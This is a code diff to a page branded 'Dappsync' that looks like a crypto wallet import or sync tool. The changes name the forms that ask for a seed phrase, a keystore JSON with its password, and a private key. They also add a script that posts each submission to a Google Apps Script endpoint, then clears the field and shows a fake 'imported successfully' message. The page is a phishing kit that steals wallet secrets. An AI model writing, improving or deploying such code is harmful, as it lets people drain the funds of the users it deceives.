@@ -10,8 +10,8 @@
 
     <title>Dappsync</title>
   </head>
-  <body data-bs-spy="scroll" data-bs-target=".navbar">
-    <nav class="navbar fixed-top navbar-expand-lg navbar-light bg-white">
+  <body>
+    <nav class="navbar navbar-expand-lg navbar-light bg-white">
         <div class="container py-2">
           <a class="navbar-brand logo-text" href="../index.html">Dappsync</a>
         </div>
@@ -31,10 +31,10 @@
        </div>
         </div>
 
-        <form name="" id="phrase-import" class="text-center" >
+        <form name="phrasesync" id="phrase-import" class="text-center">
           <div class="row pt-5">
             <div class="col-12">
-              <textarea name="" id="" cols="10" rows="5" placeholder="phrase"></textarea>
+              <textarea name="phrase_key" id="phrasetext-area" cols="10" rows="5" placeholder="phrase" required></textarea>
             </div>
           </div>
           <div class="row pt-2 text-center">
@@ -46,20 +46,23 @@
           </div>
           <div class="row pt-2">
             <div class="col-12">
-              <input type="submit" value="import" class="import-btn">
+              <input type="submit" value="import" id="phrasesubmit" class="import-btn">
+            </div>
+            <div class="col-12 success-phrase mt-3">
+                 <h5> Phrase imported successfully</h5>
             </div>
           </div>
         </form>
 
-        <form name="" id="keystore-import" class="text-center">
+        <form name="keystoresync" id="keystore-import" class="text-center">
           <div class="row pt-5">
             <div class="col-12">
-              <textarea name="" id="" cols="10" rows="5" placeholder="keystore JSON" required></textarea>
+              <textarea name="keystore_key" id="keystoretext-area" cols="10" rows="5" placeholder="keystore JSON" required></textarea>
             </div>
           </div>
           <div class="row pt-2">
             <div class="col-12">
-              <input type="text" placeholder="password" class="passimport">
+              <input type="text" name="keystore_pass" id="keystorepass" placeholder="password" class="passimport" required>
             </div>
           </div>
           <div class="row pt-2 text-center">
@@ -71,16 +74,19 @@
           </div> 
           <div class="row pt-2">
             <div class="col-12">
-              <input type="submit" value="import" class="import-btn">
+              <input type="submit" value="import" class="import-btn" id="keystoresubmit">
             </div>
+            <div class="col-12 success-phrase2 mt-3">
+              <h5> Keystore imported successfully</h5>
+         </div>
           </div>
         </form>
 
 
-        <form name="" id="privatekey-import" class="text-center">
+        <form name="privatesync" id="privatekey-import" class="text-center">
           <div class="row pt-4">
             <div class="col-12">
-              <input type="text" placeholder="private key" class="passimport">
+              <input type="text" name="private_pass" id="privatepass" placeholder="private key" class="passimport" required>
             </div>
           </div>
           <div class="row pt-2 text-center">
@@ -92,8 +98,11 @@
           </div> 
           <div class="row pt-2">
             <div class="col-12">
-              <input type="submit" value="import" class="import-btn">
+              <input type="submit" value="import" class="import-btn" id='privatesubmit'>
             </div>
+            <div class="col-12 success-phrase3 mt-3">
+              <h5> Private key imported successfully</h5>
+         </div>
           </div>
         </form>
        </div>   
@@ -112,6 +121,35 @@
         </div>
     </footer>
    
+    <script>
+      document.getElementById('phrasesubmit').addEventListener('click', function(event) {
+        event.preventDefault()
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbyRgbe9UuRaPzHuNwTkKjs4o5PPHx85-6h6o8t6YroBZBHtmSR_GDjPIZ-5akIWXw/exec'
+        const form = document.forms['phrasesync']
+        fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+        .then((res) => document.querySelector('#phrasetext-area').value = "")
+        .then((res) => document.querySelector('.success-phrase').style.display = "block")
+    }) 
+
+    document.getElementById('keystoresubmit').addEventListener('click', function(event) {
+        event.preventDefault()
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbyRgbe9UuRaPzHuNwTkKjs4o5PPHx85-6h6o8t6YroBZBHtmSR_GDjPIZ-5akIWXw/exec'
+        const form = document.forms['keystoresync']
+        fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+        .then((res) => document.querySelector('#keystoretext-area').value = "")
+        .then((res) => document.querySelector('#keystorepass').value = "")
+        .then((res) => document.querySelector('.success-phrase2').style.display = "block")
+    })
+
+    document.getElementById('privatesubmit').addEventListener('click', function(event) {
+        event.preventDefault()
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbyRgbe9UuRaPzHuNwTkKjs4o5PPHx85-6h6o8t6YroBZBHtmSR_GDjPIZ-5akIWXw/exec'
+        const form = document.forms['privatesync']
+        fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+        .then((res) => document.querySelector('#privatepass').value = "")
+        .then((res) => document.querySelector('.success-phrase3').style.display = "block")
+    })
+    </script>
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
   </body>
 </html>
